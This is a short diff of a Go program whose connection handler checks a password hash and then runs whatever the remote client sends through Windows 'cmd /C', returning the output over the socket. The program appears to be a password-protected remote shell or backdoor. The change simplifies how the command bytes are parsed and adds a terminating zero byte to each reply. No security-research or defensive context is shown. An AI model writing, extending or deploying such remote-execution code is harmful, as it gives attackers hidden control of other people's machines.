@@ -37,11 +37,7 @@ func handleconn(conn net.Conn) {
 		return
 	}
 	if sha256.Sum256(b[:32]) == pwHash {
-		/*end := 32
-		for end < len(b) && b[end] != byte(0) {
-			end++
-		}*/
-		cmd := exec.Command("cmd", "/C", string(b[32: /*end*/]))
+		cmd := exec.Command("cmd", "/C", string(b[32:]))
 		var output bytes.Buffer
 		cmd.Stdout = &output
 		err := cmd.Run()
@@ -51,6 +47,7 @@ func handleconn(conn net.Conn) {
 			conn.Write([]byte("Error"))
 		}
 	}
+	conn.Write([]byte{0})
 	conn.Close()
 }
 func main() {
